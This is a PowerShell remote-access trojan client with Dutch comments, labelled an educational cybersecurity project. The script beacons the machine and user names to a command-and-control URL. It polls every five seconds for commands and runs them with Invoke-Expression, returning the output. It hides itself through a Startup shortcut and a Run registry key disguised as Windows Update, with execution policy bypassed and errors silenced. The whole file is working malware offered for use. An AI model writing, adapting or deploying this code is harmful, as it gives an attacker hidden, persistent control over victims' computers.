# persistence.ps1
# Educational Cybersecurity Project - Remote Access Script

# Configuratie - VERANDER DEZE URL
$workerUrl = "https://your-app-name.onrender.com"
$scriptName = "WindowsUpdate.ps1"
$startupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
$scriptPath = "$env:APPDATA\$scriptName"

# Functie: Beacon naar C2
function Send-Beacon {
    param($data)
    try {
        $body = @{
            hostname = $env:COMPUTERNAME
            username = $env:USERNAME
            data = $data
            timestamp = (Get-Date).ToString()
        } | ConvertTo-Json
        
        $params = @{
            Uri = "$workerUrl/beacon"
            Method = "POST"
            Body = $body
            ContentType = "application/json"
            UseBasicParsing = $true
            TimeoutSec = 10
        }
        
        Invoke-RestMethod @params | Out-Null
    } catch {
        # Silent fail - geen errors tonen
    }
}

# Functie: Poll voor commands
function Get-Command {
    try {
        $params = @{
            Uri = "$workerUrl/command?id=$env:COMPUTERNAME"
            Method = "GET"
            UseBasicParsing = $true
            TimeoutSec = 10
        }
        
        $response = Invoke-RestMethod @params
        return $response.command
    } catch {
        return $null
    }
}

# Functie: Execute command
function Invoke-RemoteCommand {
    param($cmd)
    try {
        $output = Invoke-Expression $cmd 2>&1 | Out-String
        Send-Beacon -data @{
            type = "output"
            command = $cmd
            result = $output
        }
    } catch {
        Send-Beacon -data @{
            type = "error"
            command = $cmd
            error = $_.Exception.Message
        }
    }
}

# Installeer persistence
function Install-Persistence {
    try {
        # Kopieer script naar AppData
        if ($PSCommandPath -and (Test-Path $PSCommandPath)) {
            Copy-Item -Path $PSCommandPath -Destination $scriptPath -Force
        }
        
        # Maak startup shortcut
        $WshShell = New-Object -ComObject WScript.Shell
        $Shortcut = $WshShell.CreateShortcut("$startupPath\WindowsUpdate.lnk")
        $Shortcut.TargetPath = "powershell.exe"
        $Shortcut.Arguments = "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$scriptPath`""
        $Shortcut.WindowStyle = 7 # Hidden
        $Shortcut.Save()
        
        # Registry persistence (backup methode)
        $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
        Set-ItemProperty -Path $regPath -Name "WindowsUpdateCheck" `
            -Value "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$scriptPath`"" -Force
        
        Send-Beacon -data @{
            type = "persistence"
            message = "Persistence installed successfully"
        }
    } catch {
        Send-Beacon -data @{
            type = "persistence"
            error = $_.Exception.Message
        }
    }
}

# Main loop
function Start-C2Client {
    # Installeer persistence bij eerste run
    if (-not (Test-Path $scriptPath)) {
        Install-Persistence
    }
    
    # Stuur initial beacon
    Send-Beacon -data @{
        type = "init"
        message = "Client connected"
        os = [System.Environment]::OSVersion.VersionString
        psversion = $PSVersionTable.PSVersion.ToString()
    }
    
    # Command polling loop
    while ($true) {
        try {
            $cmd = Get-Command
            if ($cmd) {
                Invoke-RemoteCommand -cmd $cmd
            }
            Start-Sleep -Seconds 5  # Poll elke 5 seconden
        } catch {
            # Continue bij errors
            Start-Sleep -Seconds 10
        }
    }
}

# Start de client
Start-C2Client
